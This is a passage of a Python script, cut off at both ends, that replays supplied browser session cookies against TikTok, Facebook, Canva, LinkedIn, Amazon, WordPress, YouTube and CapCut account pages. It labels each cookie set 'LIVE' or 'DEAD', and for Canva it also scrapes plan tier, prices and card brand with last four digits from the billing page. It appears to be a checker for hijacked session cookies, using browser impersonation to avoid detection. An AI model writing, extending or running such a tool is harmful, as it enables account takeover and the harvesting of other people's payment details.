        response = session.get(profile_url, headers=headers, timeout=15, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200 and f'@{username}' in final_url:
            
            stats = extract_tiktok_profile_stats(response.text)
            return {
                'status': 'success',
                'stats': stats,
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'error',
                'message': f'Cannot access profile page: {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error accessing profile: {str(e)}'
        }

def test_facebook_login(cookies):
    
    try:
        session = requests.Session()
        

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]           
            cookie_value = str(cookie['value'])[:4000]             
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        }
        
        facebook_url = "https://www.facebook.com/settings"
        response = session.get(facebook_url, headers=headers, timeout=15, allow_redirects=True)
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'facebook.com/settings' in final_url.lower():
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: LIVE - On settings page'
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings'
                }
        elif status_code == 400:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Invalid or expired cookies',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - Facebook rejected cookies'
            }
        else:
            return {
                'status': 'error',
                'message': f'HTTP error: {status_code}',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Facebook: {str(e)}'
        }

def check_facebook_cookies_complete(cookies):
    try:
       
        required_cookies = ['c_user', 'xs', 'datr', 'fr', 'sb']
        
       
        cookie_names = [cookie['name'] for cookie in cookies]
        
       
        missing_cookies = []
        for required in required_cookies:
            if required not in cookie_names:
                missing_cookies.append(required)
        
        if not missing_cookies:
            return "Status: Complete Cookies - LIVE"
        else:
            return f"Status: Missing cookies - {', '.join(missing_cookies)}"
        
    except Exception as e:
        return f"Status: Error when checking - {str(e)}"

def extract_canva_plan(html_content):
   
    try:
        import re
        
        
        
       
        auto_plan_patterns = [
            r'<h4[^>]*class="[^"]*"[^>]*>([^<]+)</h4>',
           
            r'<h[1-6][^>]*>([^<]*(?:plan|subscription|tier|account|membership|miễn phí|gratis|free|pro|premium|đội nhóm|teams?|business|doanh nghiệp|gratuito|profesional|equipo|empresa|gratuit|professionnel|équipe|entreprise|kostenlos|professionell|mannschaft|unternehmen|professionale|squadra|azienda|無料|プロ|チーム|ビジネス|免费|专业|团队|企业|무료|프로|팀|비즈니스|professioneel|bedrijf|бесплатно|профессиональный|команда|бизнес|ฟรี|โปร|ทีม|ธุรกิจ|مجاني|محترف|فريق|أعمال)[^<]*)</h[1-6]>',
           
            r'<div[^>]*class="[^"]*plan[^"]*"[^>]*>([^<]+)</div>',
            r'<div[^>]*class="[^"]*subscription[^"]*"[^>]*>([^<]+)</div>',
        ]
        
        detected_plans = []
        
        for pattern in auto_plan_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                plan_text = match.strip()
               
                if len(plan_text) > 3 and len(plan_text) < 50: 
                    
                    skip_words = ['button', 'menu', 'nav', 'header', 'footer', 'close', 'open', 'click', 'settings']
                    if not any(skip in plan_text.lower() for skip in skip_words):
                       
                        plan_indicators = [

                            'canva', 'pro', 'free', 'gratis', 'premium', 'basic', 'standard', 'business', 'enterprise', 'team', 'personal', 'individual',
                            
                            'miễn phí', 'đội nhóm', 'doanh nghiệp', 'cá nhân', 'chuyên nghiệp', 'cơ bản', 'nâng cao',

                            'gratuito', 'gratis', 'profesional', 'equipo', 'empresa', 'personal', 'básico', 'estándar', 'avanzado',
                            
                            'gratuit', 'professionnel', 'équipe', 'entreprise', 'personnel', 'basique', 'standard', 'avancé',

                            'kostenlos', 'professionell', 'mannschaft', 'unternehmen', 'persönlich', 'basis', 'erweitert',
                            'gratuito', 'profissional', 'equipe', 'empresa', 'pessoal', 'básico', 'padrão', 'avançado',
                            
                            'gratuito', 'professionale', 'squadra', 'azienda', 'personale', 'base', 'standard', 'avanzato',

                            '無料', 'プロ', 'チーム', 'ビジネス', '個人', 'ベーシック', 'スタンダード', 'プレミアム',
                            '免费', '专业', '团队', '企业', '个人', '基础', '标准', '高级',
                           
                            '무료', '프로', '팀', '비즈니스', '개인', '기본', '표준', '고급',
                           
                            'gratis', 'professioneel', 'team', 'bedrijf', 'persoonlijk', 'basis', 'standaard', 'geavanceerd',
                           
                            'бесплатно', 'профессиональный', 'команда', 'бизнес', 'личный', 'базовый', 'стандартный', 'продвинутый',
                           
                            'ฟรี', 'โปร', 'ทีม', 'ธุรกิจ', 'ส่วนบุคคล', 'พื้นฐาน', 'มาตรฐาน', 'ขั้นสูง',
                           
                            'مجاني', 'محترف', 'فريق', 'أعمال', 'شخصي', 'أساسي', 'قياسي', 'متقدم'
                        ]
                        if any(indicator in plan_text.lower() for indicator in plan_indicators):
                            detected_plans.append(plan_text)
        
       
        if detected_plans:
           
            best_plan = detected_plans[0]
            
           
            paid_indicators = [
                
                'pro', 'premium', 'business', 'enterprise', 'team', 'plus', 'advanced', 'standard',
               
                'đội nhóm', 'doanh nghiệp', 'chuyên nghiệp', 'nâng cao',

                'profesional', 'equipo', 'empresa', 'estándar', 'avanzado',
                
                'professionnel', 'équipe', 'entreprise', 'standard', 'avancé',

                'professionell', 'mannschaft', 'unternehmen', 'erweitert',
                'profissional', 'equipe', 'empresa', 'padrão', 'avançado',
               
                'professionale', 'squadra', 'azienda', 'standard', 'avanzato',
                
                'プロ', 'チーム', 'ビジネス', 'スタンダード', 'プレミアム',
                
                '专业', '团队', '企业', '标准', '高级',
                
                '프로', '팀', '비즈니스', '표준', '고급',
                
                'professioneel', 'team', 'bedrijf', 'standaard', 'geavanceerd',
                
                'профессиональный', 'команда', 'бизнес', 'стандартный', 'продвинутый',
                
                'โปร', 'ทีม', 'ธุรกิจ', 'มาตรฐาน', 'ขั้นสูง',
                
                'محترف', 'فريق', 'أعمال', 'قياسي', 'متقدم'
            ]
            free_indicators = [

                'free', 'gratis', 'basic', 'trial', 'personal', 'individual',
                
                'miễn phí', 'cơ bản', 'cá nhân',
                
                'gratuito', 'gratis', 'personal', 'básico',

                'gratuit', 'personnel', 'basique',
                
                'kostenlos', 'persönlich', 'basis',
                
                'gratuito', 'pessoal', 'básico',
                
                'gratuito', 'personale', 'base',
                
                '無料', '個人', 'ベーシック',
               
                '免费', '个人', '基础',
               
                '무료', '개인', '기본',
               
                'gratis', 'persoonlijk', 'basis',   
                'бесплатно', 'личный', 'базовый',
                'ฟรี', 'ส่วนบุคคล', 'พื้นฐาน',
                'مجاني', 'شخصي', 'أساسي'
            ]
            
            is_paid = any(paid in best_plan.lower() for paid in paid_indicators)
            is_free = any(free in best_plan.lower() for free in free_indicators)
            
            if is_paid or (not is_free and 'canva' in best_plan.lower()):
                
                payment_info = extract_payment_info(html_content)
                return f"Plan: {best_plan}{payment_info}"
            else:
                
                return f"Plan: {best_plan}"
        
        
        business_patterns = [
            r'<h[1-6][^>]*>([^<]*Teams?[^<]*)</h[1-6]>',
            r'<h[1-6][^>]*>([^<]*Business[^<]*)</h[1-6]>',
            r'<h[1-6][^>]*>([^<]*Enterprise[^<]*)</h[1-6]>',
            r'<div[^>]*>([^<]*Teams?[^<]*)</div>',
            r'<div[^>]*>([^<]*Business[^<]*)</div>',
        ]
        
        for pattern in business_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
            if match:
                plan_name = match.group(1).strip()
                payment_info = extract_payment_info(html_content)
                return f"Plan: {plan_name}{payment_info}"
        
        
        subscription_indicators = [
            r'subscription',
            r'plan',
            r'billing',
            r'payment',
            r'price',
            r'cost',
            r'upgrade',
            r'premium',
            r'monthly',
            r'annual',
            r'yearly',
        ]
        
        subscription_count = 0
        for indicator in subscription_indicators:
            if re.search(indicator, html_content, re.IGNORECASE):
                subscription_count += 1
        
        
        currency_patterns = [
            r'(\$\d+[\d.,]*)', 
            r'(€\d+[\d.,]*)',   
            r'(£\d+[\d.,]*)',   
            r'(¥\d+[\d.,]*)',   
            r'(\d+[\d.,]*\s*USD)', 
            r'(\d+[\d.,]*\s*EUR)', 
        ]
        
        found_price = None
        for pattern in currency_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                found_price = match.group(1).strip()
                break
        

        json_patterns = [
            r'"planType"[^"]*"[^"]*"([^"]*)"', 
            r'"subscription_type"[^"]*"[^"]*"([^"]*)"', 
            r'"tier"[^"]*"[^"]*"([^"]*)"', 
            r'data-plan[^=]*=[^"]*"([^"]*)"', 
        ]
        
        for pattern in json_patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                plan_type = match.group(1).strip()
                if plan_type.lower() not in ['', 'null', 'undefined']:
                    price_info = f" | {found_price}" if found_price else ""
                    return f"Plan: {plan_type.title()}{price_info}"
        

        has_upgrade_button = bool(re.search(r'upgrade|improve|enhance', html_content, re.IGNORECASE))
        has_billing_info = subscription_count >= 3
        has_price = found_price is not None
        
        if has_price:
            return f"Plan: Paid Plan | {found_price}"
        elif has_upgrade_button and has_billing_info:
            return "Plan: Free (with upgrade options)"
        elif has_billing_info:
            return "Plan: Free (billing page accessed)"
        

        spa_result = extract_canva_plan_from_spa(html_content)
        if spa_result and "Unknown - SPA content" not in spa_result:
            return spa_result
        
        return "Plan: Unknown - Could not detect plan type"
        
    except Exception as e:
        return f"Plan: Error - {str(e)}"

def extract_payment_info(html_content):
    
    try:
        import re
        
        
        auto_payment_patterns = [
            
            r'([¥€£$₹¢₽₿]\d+[\d.,]*[^<]{0,15})', 
            r'(\d+[\d.,]*[^<]{0,5}[¥€£$₹¢₽₿][^<]{0,15})', 
            
            r'(\d+[\d.,]*\s*(?:USD|EUR|GBP|JPY|CNY|INR|CAD|AUD|CHF|SEK|NOK|DKK|PLN|CZK|HUF|BGN|RON|HRK|RUB|TRY|BRL|MXN|KRW|SGD|HKD|THB|VND|PHP|IDR|MYR)[^<]{0,15})',
            
            r'(\d+[^<]{0,15}(?:month|year|annual|monthly|yearly|tháng|năm|mese|año|mois|année|monat|jahr|månader|år|miesięcy|lat|měsíc|rok)[^<]{0,10})',
            
            r'((?:Visa|Mastercard|Master Card|American Express|Amex|Discover|PayPal|Apple Pay|Google Pay|Stripe|UnionPay)\s*[•*·]{0,10}\s*\d{4})',
            
            r'(\d+(?:&nbsp;|\s)+[A-Z]{2,4}\$[^<]{0,15})', 
            r'(\d+(?:&nbsp;|\s)*[^<]{0,10}/(?:month|year|tháng|năm|mese|año)[^<]{0,10})', 
        ]
        
        
        all_payment_info = []
        
        for pattern in auto_payment_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                payment_info = match.strip()
                
                payment_info = payment_info.replace('&nbsp;', ' ').replace('&amp;', '&').replace('&lt;', '<').replace('&gt;', '>')
                
                if payment_info and len(payment_info) > 2:
                    
                    is_duplicate = False
                    for existing in all_payment_info:
                        if payment_info in existing or existing in payment_info:
                            
                            if len(payment_info) > len(existing):
                                all_payment_info.remove(existing)
                                all_payment_info.append(payment_info)
                            is_duplicate = True
                            break
                    if not is_duplicate:
                        all_payment_info.append(payment_info)
        
        
        if all_payment_info:
            return f" | {' · '.join(all_payment_info)}"
        
        return ""
        
    except Exception as e:
        return ""

def extract_canva_plan_from_spa(html_content):
    
    try:
        import re
        

        js_auto_patterns = [
            
            r'"[^"]*"[^"]*"([^"]*Canva\s+Pro[^"]{0,15})"', 
            r'"[^"]*"[^"]*"([^"]*Canva\s+(?:Teams?|Business|Enterprise|Đội nhóm|Doanh nghiệp|Equipo|Empresa|Équipe|Entreprise|Mannschaft|Unternehmen|Squadra|Azienda|チーム|ビジネス|团队|企业|팀|비즈니스|Team|Bedrijf|Команда|Бизнес|ทีม|ธุรกิจ|فريق|أعمال)[^"]{0,15})"',
            r'"[^"]*"[^"]*"([^"]*Canva\s+(?:Gratis|Free|Miễn phí|Gratuito|Gratuit|Kostenlos|Gratuito|無料|免费|무료|Бесплатно|ฟรี|مجاني)[^"]{0,15})"',
            
            r'"subscription"[^}]*"[^"]*"[^"]*"([^"]{5,30})"',
            r'"plan[^"]*"[^"]*"([^"]{3,30})"',
            r'"tier[^"]*"[^"]*"([^"]{3,30})"',
            r'"account[^"]*"[^"]*"([^"]{3,30})"',
            r'"membership[^"]*"[^"]*"([^"]{3,30})"',
            
            r'"[^"]*"[^"]*"([^"]*Canva[^"]{0,20})"',
        ]
        
        detected_js_plans = []
        
        for pattern in js_auto_patterns:
            matches = re.findall(pattern, html_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                plan_text = match.strip()
                
                if 3 <= len(plan_text) <= 50:
                    
                    skip_js = ['true', 'false', 'null', 'undefined', 'http', 'www', '.com', '.js', '.css', 'function', 'var', 'const']
                    if not any(skip in plan_text.lower() for skip in skip_js):
                        
                        plan_indicators = [

                            'canva', 'pro', 'free', 'gratis', 'premium', 'basic', 'business', 'enterprise', 'team', 'personal', 'plus', 'standard', 'advanced',
                            
                            'miễn phí', 'đội nhóm', 'doanh nghiệp', 'cá nhân', 'chuyên nghiệp', 'cơ bản', 'nâng cao',
                            
                            'gratuito', 'profesional', 'equipo', 'empresa', 'personal', 'básico', 'estándar', 'avanzado',
                            
                            'gratuit', 'professionnel', 'équipe', 'entreprise', 'personnel', 'basique', 'avancé',
                            
                            'kostenlos', 'professionell', 'mannschaft', 'unternehmen', 'persönlich', 'basis', 'erweitert',
                            
                            'gratuito', 'profissional', 'equipe', 'empresa', 'pessoal', 'básico', 'padrão', 'avançado',
                            
                            'gratuito', 'professionale', 'squadra', 'azienda', 'personale', 'base', 'avanzato',
                            
                            '無料', 'プロ', 'チーム', 'ビジネス', '個人', 'ベーシック', 'スタンダード', 'プレミアム',
                            
                            '免费', '专业', '团队', '企业', '个人', '基础', '标准', '高级',
                            
                            '무료', '프로', '팀', '비즈니스', '개인', '기본', '표준', '고급',
                            
                            'gratis', 'professioneel', 'team', 'bedrijf', 'persoonlijk', 'basis', 'standaard', 'geavanceerd',
                            
                            'бесплатно', 'профессиональный', 'команда', 'бизнес', 'личный', 'базовый', 'стандартный', 'продвинутый',
                            
                            'ฟรี', 'โปร', 'ทีม', 'ธุรกิจ', 'ส่วนบุคคล', 'พื้นฐาน', 'มาตรฐาน', 'ขั้นสูง',
                            
                            'مجاني', 'محترف', 'فريق', 'أعمال', 'شخصي', 'أساسي', 'قياسي', 'متقدم'
                        ]
                        if any(indicator in plan_text.lower() for indicator in plan_indicators):
                            detected_js_plans.append(plan_text)
        

        if detected_js_plans:
            
            canva_plans = [p for p in detected_js_plans if 'canva' in p.lower()]
            best_js_plan = canva_plans[0] if canva_plans else detected_js_plans[0]
            
            
            plan_name = best_js_plan.strip()
            plan_name = plan_name.replace('\\\\', '').replace('\\', '').strip()
            
            plan_name = re.sub(r'\s+(Oct|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Nov|Dec)\s+\d{4}\s+Pricing.*', '', plan_name, flags=re.IGNORECASE)

            if 'canva' in plan_name.lower():
                
                core_indicators = ['pro', 'gratis', 'free', 'premium', 'business', 'enterprise', 'teams?', 'basic', 'standard', 'advanced', 'plus']
                for indicator in core_indicators:
                    pattern = rf'(Canva\s+{indicator})'
                    core_match = re.search(pattern, plan_name, re.IGNORECASE)
                    if core_match:
                        plan_name = core_match.group(1).strip()
                        break
            
            return f"Plan: {plan_name} (auto-detected from JS)"
        
        
        
        if '"subscription"' in html_content.lower() or '"billing"' in html_content.lower():
            return "Plan: Unknown - Billing/subscription data found but plan type not detected"
        
        
        if 'billing-and-teams' in html_content.lower() or 'settings' in html_content.lower():
            return "Plan: Likely Free - Billing page accessible but no paid plan detected"
        
        return "Plan: Unknown - SPA content requires JavaScript rendering"
        
    except Exception as e:
        return f"Plan: Error in SPA extraction - {str(e)}"

def test_canva_login(cookies):
    
    try:
        if not HAS_CURL_CFFI:
            
            return test_canva_login_fallback(cookies)
        
        
        session = crequests.Session(impersonate="chrome")
        
        
        session.headers.update({
            "User-Agent": CUSTOM_USER_AGENT,
        })
        

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        
        settings_url = "https://www.canva.com/settings/"
        response = session.get(settings_url, timeout=30, allow_redirects=True)
        
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis',
                'plan_info': 'Plan: Error - Response too large'
            }
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'canva.com/settings' in final_url.lower():
                
                plan_info = "Plan: Unknown - On settings page"
                
                try:
                    
                    billing_response = session.get("https://www.canva.com/settings/billing-and-teams", timeout=15)
                    if billing_response.status_code == 200 and 'billing-and-teams' in billing_response.url.lower():
                        plan_info = extract_canva_plan(billing_response.text)
                        if plan_info == "Plan: Unknown - Could not detect plan type":
                            plan_info = "Plan: Unknown - Billing page accessible but no plan detected"
                    else:
                        plan_info = "Plan: Unknown - Settings accessible but billing page not accessible"
                except Exception as e:
                    plan_info = "Plan: Unknown - Settings accessible but billing page error"
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings'
                }
        elif status_code == 403:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Access forbidden (403)',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': 'Status: DEAD - 403 Forbidden'
            }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code}',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code}'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Canva login: {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_canva_login_fallback(cookies):
    
    try:
        session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            cookie_name = str(cookie['name'])[:100]
            cookie_value = str(cookie['value'])[:4000]
            
            session.cookies.set(
                cookie_name, 
                cookie_value, 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT
        }
        
        
        settings_url = "https://www.canva.com/settings/"
        response = session.get(settings_url, headers=headers, timeout=15, allow_redirects=True)
        
        if len(response.content) > 50 * 1024 * 1024:
            return {
                'status': 'error',
                'message': 'Response too large, skipping analysis (fallback)',
                'plan_info': 'Plan: Error - Response too large'
            }
        
        final_url = response.url
        status_code = response.status_code
        
        if status_code == 200:
            if 'canva.com/settings' in final_url.lower():
                
                plan_info = "Plan: Unknown - On settings page (fallback)"
                
                try:
                    
                    billing_response = session.get("https://www.canva.com/settings/billing-and-teams", headers=headers, timeout=15)
                    if billing_response.status_code == 200 and 'billing-and-teams' in billing_response.url.lower():
                        plan_info = extract_canva_plan(billing_response.text)
                        if plan_info == "Plan: Unknown - Could not detect plan type":
                            plan_info = "Plan: Unknown - Billing page accessible but no plan detected (fallback)"
                    else:
                        plan_info = "Plan: Unknown - Settings accessible but billing page not accessible (fallback)"
                except Exception as e:
                    plan_info = "Plan: Unknown - Settings accessible but billing page error (fallback)"
                
                return {
                    'status': 'success',
                    'message': 'Cookie LIVE - Access to settings page (fallback)',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': plan_info
                }
            else:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected from settings (fallback)',
                    'final_url': final_url,
                    'status_code': status_code,
                    'plan_info': 'Status: DEAD - Cannot access settings (fallback)'
                }
        else:
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - HTTP {status_code} (fallback)',
                'final_url': final_url,
                'status_code': status_code,
                'plan_info': f'Status: DEAD - HTTP {status_code} (fallback)'
            }
            
    except Exception as e:
        return {
            'status': 'error',
            'message': f'Error testing Canva login (fallback): {str(e)}',
            'plan_info': f'Status: Error - {str(e)}'
        }

def test_linkedin_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.linkedin.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.linkedin.com/mypreferences/d/categories/account"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/uas/login' in redirect_location or '/login' in redirect_location:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        elif status_code == 200 and '/mypreferences/d/categories/account' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Account preferences accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing LinkedIn cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing LinkedIn login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_amazon_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.amazon.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.amazon.com/gp/your-account/order-history?ref_=ya_d_c_yo"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/signin' in redirect_location or '/ap/signin' in redirect_location or 'sign-in' in redirect_location:
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to sign-in page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        elif status_code == 200 and '/gp/your-account/order-history' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Order history accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing Amazon cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing Amazon login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_wordpress_login(cookies):
    
    try:
        if HAS_CURL_CFFI:
            session = crequests.Session(impersonate="chrome")
        else:
            session = requests.Session()
        
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'], 
                cookie['value'], 
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://wordpress.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        session.headers.update(headers)
        
        target_url = "https://wordpress.com/me/"
        response = session.get(target_url, timeout=30, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', '')
            if '/log-in' in redirect_location or 'login' in redirect_location.lower():
                return {
                    'status': 'dead',
                    'message': 'Cookie DEAD - Redirected to login page',
                    'final_url': redirect_location,
                    'status_code': status_code
                }
        
        
        response = session.get(target_url, timeout=30, allow_redirects=True)
        final_url = response.url
        content = response.text
        
        
        authenticated_patterns = [
            r'data-user-id="(\d+)"',
            r'"user_id":(\d+)',
            r'"username":"([^"]+)"',
            r'"display_name":"([^"]+)"',
            r'class="[^"]*account[^"]*settings[^"]*"',
            r'My Sites',
            r'Account Settings',
        ]
        
        auth_found = []
        user_data = {}
        
        for pattern in authenticated_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                auth_found.append((pattern, matches[0] if isinstance(matches[0], str) else str(matches[0])))
                if 'user_id' in pattern:
                    user_data['user_id'] = matches[0]
                elif 'username' in pattern:
                    user_data['username'] = matches[0]
                elif 'display_name' in pattern:
                    user_data['display_name'] = matches[0]
        
        login_prompts = [
            r'Sign up or log in',
            r'Log in to WordPress\.com',
            r'Create your account',
            r'class="[^"]*login-form[^"]*"',
            r'id="[^"]*login[^"]*"'
        ]
        
        login_found = []
        for pattern in login_prompts:
            if re.search(pattern, content, re.IGNORECASE):
                login_found.append(pattern)
        
        if user_data:
            user_info = ', '.join([f"{k}: {v}" for k, v in user_data.items()])
            return {
                'status': 'success',
                'message': f'Cookie LIVE - User authenticated ({user_info})',
                'final_url': final_url,
                'status_code': status_code,
                'user_data': user_data
            }
        elif auth_found and not login_found:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Authentication indicators found',
                'final_url': final_url,
                'status_code': status_code,
                'auth_indicators': len(auth_found)
            }
        elif login_found:
            return {
                'status': 'dead',
                'message': 'Cookie DEAD - Login prompts detected',
                'final_url': final_url,
                'status_code': status_code,
                'login_prompts': len(login_found)
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unclear authentication status (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing WordPress cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing WordPress login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_youtube_login(cookies):
    
    try:
        session = requests.Session()
        
        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )
        
        headers = {
            'User-Agent': CUSTOM_USER_AGENT,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.youtube.com/',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        target_url = "https://www.youtube.com/account"
        response = session.get(target_url, headers=headers, timeout=15, allow_redirects=False)
        
        status_code = response.status_code
        final_url = response.url
        
        if status_code in [301, 302, 303, 307, 308]:
            redirect_location = response.headers.get('Location', 'Unknown')
            return {
                'status': 'dead',
                'message': f'Cookie DEAD - Redirected to login (Status: {status_code})',
                'final_url': redirect_location,
                'status_code': status_code
            }
        elif status_code == 200 and '/account' in final_url:
            return {
                'status': 'success',
                'message': 'Cookie LIVE - Account page accessible',
                'final_url': final_url,
                'status_code': status_code
            }
        else:
            return {
                'status': 'unknown',
                'message': f'Unexpected response (Status: {status_code})',
                'final_url': final_url,
                'status_code': status_code
            }
            
    except requests.exceptions.Timeout:
        return {
            'status': 'unknown',
            'message': 'Timeout occurred while testing YouTube cookies',
            'final_url': 'N/A',
            'status_code': 'Timeout'
        }
    except Exception as e:
        return {
            'status': 'unknown',
            'message': f'Error testing YouTube login: {str(e)}',
            'final_url': 'N/A',
            'status_code': 'Error'
        }

def test_capcut_login(cookies):

    try:
        session = requests.Session()

        for cookie in cookies:
            domain = cookie['domain'].lstrip('.')
            session.cookies.set(
                cookie['name'],
                cookie['value'],
                domain=domain,
                path=cookie['path'],
                secure=cookie['secure']
            )

        headers = {
